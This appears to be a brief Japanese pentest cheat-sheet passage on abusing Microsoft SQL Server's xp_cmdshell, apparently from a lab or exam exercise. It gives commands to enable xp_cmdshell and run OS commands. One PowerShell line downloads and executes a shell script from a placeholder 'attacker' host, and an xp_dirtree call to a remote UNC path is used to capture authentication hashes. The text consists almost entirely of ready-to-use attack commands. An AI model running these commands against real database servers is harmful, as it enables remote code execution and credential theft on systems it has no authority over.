### 有効化（sysadmin権限が必要）
```c
SQL (zeus\db_user  guest@msdb)> 

EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

### OSコマンドの実行
```c
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')"';
exec xp_dirtree '\\192.168.45.186\test';
```